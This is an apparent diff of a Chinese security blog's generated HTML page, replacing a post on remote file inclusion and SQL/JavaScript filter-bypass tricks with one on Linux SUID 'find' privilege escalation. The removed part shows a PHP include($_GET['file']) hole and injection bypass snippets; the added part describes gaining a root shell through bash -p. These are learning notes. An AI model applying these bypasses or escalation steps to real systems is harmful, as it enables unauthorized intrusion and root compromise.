@@ -16,22 +16,27 @@
   <meta name="author" content="想有双手">
   <meta name="keywords" content="">
   
-    <meta name="description" content="远程文件包含在进行文件包含时，不一定非要包含目标主机的文件，也可以包含自己电脑上的文件，举个例子： 先在本地创建一个网站，名字随便，这里起名test.com，端口81，文件包含的文件名是1.php，内容是： 123&lt;?phpinclude($_GET[&amp;#x27;file&amp;#x27;]);?&gt;  本地被包含的文件名为1.txt，内容是： 123&lt;?phpphpinfo();?&amp;g">
+    <meta name="description" content="Linux find提权前言Linux文件普通权限r(read)读，数字表示：4 w(write)写，数字表示：2 x(execute)执行，数字表示：1 Linux文件特殊权限linux文件的三种特殊权限分别是：suid权限、sgid权限、sticky权限；其中suid权限作用于文件属主，sgid权限作用于属组上，sticky权限作用于other其他上。 suid：作用：让普通用户临时拥有该文件">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tips">
-<meta property="og:url" content="http://example.com/2023/05/18/Tips/index.html">
+<meta property="og:title" content="find提权">
+<meta property="og:url" content="http://example.com/2023/08/13/find%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="ldy的站点~">
-<meta property="og:description" content="远程文件包含在进行文件包含时，不一定非要包含目标主机的文件，也可以包含自己电脑上的文件，举个例子： 先在本地创建一个网站，名字随便，这里起名test.com，端口81，文件包含的文件名是1.php，内容是： 123&lt;?phpinclude($_GET[&amp;#x27;file&amp;#x27;]);?&gt;  本地被包含的文件名为1.txt，内容是： 123&lt;?phpphpinfo();?&amp;g">
+<meta property="og:description" content="Linux find提权前言Linux文件普通权限r(read)读，数字表示：4 w(write)写，数字表示：2 x(execute)执行，数字表示：1 Linux文件特殊权限linux文件的三种特殊权限分别是：suid权限、sgid权限、sticky权限；其中suid权限作用于文件属主，sgid权限作用于属组上，sticky权限作用于other其他上。 suid：作用：让普通用户临时拥有该文件">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-05-18T06:52:02.000Z">
-<meta property="article:modified_time" content="2023-07-31T03:34:07.463Z">
+<meta property="og:image" content="http://example.com/2023/08/13/find%E6%8F%90%E6%9D%83/1.png">
+<meta property="og:image" content="http://example.com/2023/08/13/find%E6%8F%90%E6%9D%83/2.png">
+<meta property="og:image" content="http://example.com/2023/08/13/find%E6%8F%90%E6%9D%83/3.png">
+<meta property="article:published_time" content="2023-08-13T09:03:25.000Z">
+<meta property="article:modified_time" content="2023-08-13T10:36:59.902Z">
 <meta property="article:author" content="想有双手">
-<meta property="article:tag" content="远程文件包含 sql绕过">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="find提权">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/08/13/find%E6%8F%90%E6%9D%83/1.png">
   
   
   
-  <title>Tips - ldy的站点~</title>
+  <title>find提权 - ldy的站点~</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Tips"></span>
+            <span id="subtitle" data-typed-text="find提权"></span>
           
         </div>
 
@@ -208,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-05-18 14:52" pubdate>
-          2023年5月18日 下午
+        <time datetime="2023-08-13 17:03" pubdate>
+          2023年8月13日 下午
         </time>
       </span>
     
@@ -220,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          933 字
         
       </span>
     
@@ -231,7 +236,7 @@
         
         
         
-          10 分钟
+          8 分钟
         
       </span>
     
@@ -269,139 +274,31 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Tips</h1>
+            <h1 style="display: none">find提权</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>在进行文件包含时，不一定非要包含目标主机的文件，也可以包含自己电脑上的文件，举个例子：</p>
-<p>先在本地创建一个网站，名字随便，这里起名test.com，端口81，文件包含的文件名是1.php，内容是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>本地被包含的文件名为1.txt，内容是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>然后看一下自己的ip，这里是192.168.120.1</p>
-<p><strong>划重点，这里我的ip是vmnet1（仅主机）下的ip，如果想复现的话别搞错ip</strong></p>
-<p>包含的url：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">120.132</span><span class="hljs-regexp">/1.php?file=http:/</span><span class="hljs-regexp">/192.168.120.1:81/</span><span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
-
-<p>依然能看到服务器的phpinfo()信息。</p>
-<hr>
-<h3 id="sql一些特性"><a href="#sql一些特性" class="headerlink" title="sql一些特性"></a>sql一些特性</h3><h4 id="1-exp-函数"><a href="#1-exp-函数" class="headerlink" title="1.exp()函数"></a>1.exp()函数</h4><p>exp(x)函数是计算自然常数e的x次方的函数，exp(709)合法而exp(710)非法，因此，在进行盲注时，若if()被过滤，可转而使用exp()，如：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> if(ascii(&#x27;d&#x27;)=<span class="hljs-number">100</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>
-
-<p>等价于：</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> exp(<span class="hljs-number">710</span>-ascii(<span class="hljs-string">&#x27;d&#x27;</span>)=<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure>
-
-<p>返回值都是1(true)</p>
-<h4 id="2-and-1-x3D-1"><a href="#2-and-1-x3D-1" class="headerlink" title="2.and 1&#x3D;1"></a>2.and 1&#x3D;1</h4><p>如果不行，and 1也是一样的</p>
-<h4 id="3-ord"><a href="#3-ord" class="headerlink" title="3.ord()"></a>3.ord()</h4><p>ord(str)函数用于查找字符串中最左侧字符，若最左侧字符为单字节字符，ord()函数返回该字符的ascii值，根据此特性，ord()函数可以用来代替ascii()函数</p>
-<h4 id="4-x2F-x2F"><a href="#4-x2F-x2F" class="headerlink" title="4. &#x2F;**&#x2F;"></a>4. &#x2F;**&#x2F;</h4><p>当database()被拦，可以尝试database&#x2F;**&#x2F;()效果一样</p>
-<p>database(&#x2F;**&#x2F;)也可以正常执行，当然，上述两种方法可以组合。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">database/*!(*/)     //这也是可以的<br></code></pre></td></tr></table></figure>
-
-<p>由此，version()也行</p>
-<h3 id="5-current-user"><a href="#5-current-user" class="headerlink" title="5.current_user"></a>5.current_user</h3><p>在挖src时，拿到当前用户大概率会被收</p>
-<hr>
-<h3 id="js一些特性"><a href="#js一些特性" class="headerlink" title="js一些特性"></a>js一些特性</h3><p>1.js有特殊字符转义字符，当空格被过滤，可以使用Unicode绕过，附对照表</p>
-<table>
-<thead>
-<tr>
-<th>Unicode 字符值</th>
-<th>转义序列</th>
-<th>含义</th>
-<th>类别</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>\u0008</td>
-<td>\b</td>
-<td>Backspace</td>
-<td></td>
-</tr>
-<tr>
-<td>\u0009</td>
-<td>\t</td>
-<td>Tab</td>
-<td>空白</td>
-</tr>
-<tr>
-<td>\u000A</td>
-<td>\n</td>
-<td>换行符（换行）</td>
-<td>行结束符</td>
-</tr>
-<tr>
-<td>\u000B</td>
-<td>\v</td>
-<td>垂直制表符</td>
-<td>空白</td>
-</tr>
-<tr>
-<td>\u000C</td>
-<td>\f</td>
-<td>换页</td>
-<td>空白</td>
-</tr>
-<tr>
-<td>\u000D</td>
-<td>\r</td>
-<td>回车</td>
-<td>行结束符</td>
-</tr>
-<tr>
-<td>\u0020</td>
-<td></td>
-<td>空格</td>
-<td>空白</td>
-</tr>
-<tr>
-<td>\u0022</td>
-<td>&quot;</td>
-<td>双引号 (“)</td>
-<td></td>
-</tr>
-<tr>
-<td>\u0027</td>
-<td>&#39;</td>
-<td>单引号 (‘)</td>
-<td></td>
-</tr>
-<tr>
-<td>\u005C</td>
-<td>\</td>
-<td>反斜杠 ()</td>
-<td></td>
-</tr>
-<tr>
-<td>\u00A0</td>
-<td></td>
-<td>不间断空格</td>
-<td>空白</td>
-</tr>
-<tr>
-<td>\u2028</td>
-<td></td>
-<td>行分隔符</td>
-<td>行结束符</td>
-</tr>
-<tr>
-<td>\u2029</td>
-<td></td>
-<td>段落分隔符</td>
-<td>行结束符</td>
-</tr>
-<tr>
-<td>\uFEFF</td>
-<td></td>
-<td>字节顺序标记</td>
-<td>空白</td>
-</tr>
-</tbody></table>
-<p>如：</p>
-<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">select\<span class="hljs-built_in">u000Bdatabase</span>();<br></code></pre></td></tr></table></figure>
-
+                <h3 id="Linux-find提权"><a href="#Linux-find提权" class="headerlink" title="Linux find提权"></a>Linux find提权</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h5 id="Linux文件普通权限"><a href="#Linux文件普通权限" class="headerlink" title="Linux文件普通权限"></a>Linux文件普通权限</h5><p>r(read)读，数字表示：4</p>
+<p>w(write)写，数字表示：2</p>
+<p>x(execute)执行，数字表示：1</p>
+<h5 id="Linux文件特殊权限"><a href="#Linux文件特殊权限" class="headerlink" title="Linux文件特殊权限"></a>Linux文件特殊权限</h5><p>linux文件的三种特殊权限分别是：suid权限、sgid权限、sticky权限；其中suid权限作用于文件属主，sgid权限作用于属组上，sticky权限作用于other其他上。</p>
+<p><strong>suid</strong>：作用：让普通用户临时拥有该文件的属主的执行权限，suid权限只能应用在二进制可执行文件（命令）上，而且suid权限只能设置在属主位置上。</p>
+<p>suid权限使用s表示，增加权限u+s，移除权限u-s；<br>suid权限也可以使用数字形式表示，0表示去除suid权限，4表示添加suid权限，而且是在原权限的数字表达形式开头加0或4，如：0755移除suid权限，4755添加suid权限。</p>
+<p>例如：普通用户执行执行passwd命令时需要去修改&#x2F;etc&#x2F;shaow等文件，但ll &#x2F;etc&#x2F;shaow发现该文件没有任何权限，即普通用户对&#x2F;etc&#x2F;shaow文件是没有写入权限的，所以普通用户是怎么实现成功修改自己的密码的呢？答案是临时拥有了root权限（root超级管理员可以对任何文件进行修改）来实现密码的修改，suid权限只能应用在二进制可执行文件上。</p>
+<p><strong>添加和去除suid权限</strong>：</p>
+<p>suid权限的去除可以使用数字或字母的形式添加，如果使用数字，0表示去除权限，4表示添加权限，而且是在原权限的数字表达形式开头加0或4，字母形式下，suid权限使用s表示，增加权限u+s，移除权限u-s；</p>
+<p>以上摘自CSDN博主「MssGuo」<a target="_blank" rel="noopener" href="https://blog.csdn.net/MssGuo/article/details/120754324">的原创文章</a></p>
+<p><img src="1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p>现在成功赋予find命令suid，可以进行提权了</p>
+<p><img src="2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><del>翻车了</del></p>
+<p>这里的坑就在于，利用find的exec执行命令，执行是以root的权限执行，之后却是低权限。原因在于其id上可以发现。</p>
+<p>划重点：<strong>默认情况下 bash 在执行时，如果发现 euid(effective有效uid) 和 uid 不配，会将 euid (即 suid) 强制重置为uid</strong></p>
+<p>因此需要用到参数： -p</p>
+<p><img src="3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p>可以看到，象征root的#已经显示出来了，且此时euid为root</p>
+<p>此时反弹的shell就是root权限了</p>
 
                 
               </div>
@@ -414,7 +311,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-sql%E7%BB%95%E8%BF%87/">#远程文件包含 sql绕过</a>
+        <a href="/tags/Linux/">#Linux</a>
+      
+        <a href="/tags/find%E6%8F%90%E6%9D%83/">#find提权</a>
       
     </div>
   
@@ -426,8 +325,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Tips</div>
-      <div>http://example.com/2023/05/18/Tips/</div>
+      <div>find提权</div>
+      <div>http://example.com/2023/08/13/find提权/</div>
     </div>
     <div class="license-meta">
       
@@ -439,7 +338,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年5月18日</div>
+          <div>2023年8月13日</div>
         </div>
       
       
@@ -471,18 +370,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/13/find%E6%8F%90%E6%9D%83/" title="find提权">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">find提权</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/05/05/bugkuweb/" title="bugkuweb">
-                        <span class="hidden-mobile">bugkuweb</span>
+                      <a href="/2023/05/18/Tips/" title="Tips">
+                        <span class="hidden-mobile">Tips</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
